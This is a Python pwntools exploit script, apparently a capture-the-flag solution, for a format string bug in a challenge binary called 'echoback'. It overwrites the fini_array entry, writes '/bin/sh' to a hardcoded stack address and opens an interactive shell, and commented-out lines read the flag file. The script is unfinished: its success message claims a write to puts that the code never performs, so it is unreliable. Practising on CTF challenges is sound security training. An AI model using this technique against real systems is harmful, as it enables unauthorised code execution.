from pwn import *
import sys
from libformatstr import *
context.log_level = 'info'

# r = remote('2018shell1.picoctf.com' ,56800)

elf = ELF('./echoback')
r = process(elf.path)
gdb.attach(r,'''
break vuln
''')
# bufsiz = 100
# r.recvuntil('input your message:\n')
# r.sendline(make_pattern(bufsiz))             # send cyclic pattern to server
# data = r.recv(1024)                                 # server's response
# offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
# log.info("offset : " + str(offset))
# log.info("padding: " + str(padding))
# r.close()
binsh = "\x68\x73\x2f\x6e\x69\x62\x2f"

p = FormatStr()
p[elf.sym['__do_global_dtors_aux_fini_array_entry']] = elf.sym['vuln']
p[0xffffce20] = binsh
buf = p.payload(7, 0)
r.recvuntil('input your message:\n')
r.send(buf)
log.success("Wrote system onto puts and vuln onto fini... trying shell")

r.interactive()
# r.recvrepeat(3)
# r.sendline('id')
# if "uid=" in r.recvrepeat(.5):
#     log.success("got shell")
#     r.sendline('cat flag.txt')
#     log.success("Flag: " + r.recv(1024))
# else:
#     log.error("Failed... try again")
# r.close()